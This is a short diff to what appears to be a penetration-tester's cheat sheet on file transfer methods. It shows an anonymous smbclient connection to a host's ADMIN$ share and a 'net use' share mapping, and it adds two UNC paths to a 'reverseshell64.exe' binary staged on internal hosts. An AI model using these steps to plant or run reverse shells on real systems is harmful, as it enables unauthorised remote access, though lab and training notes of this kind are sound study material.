@@ -90,6 +90,8 @@ smbclient -U '%' -N \\\\10.2.2.23\\ADMIN$
 Windows
 ```
 net use * \\192.168.119.142\lolll
+\\MAIL\Users\eric\Desktop\reverseshell64.exe
+\\\\10.11.1.229\\share\\reverseshell64.exe
 ```
 
 ## Linux transfer file methods
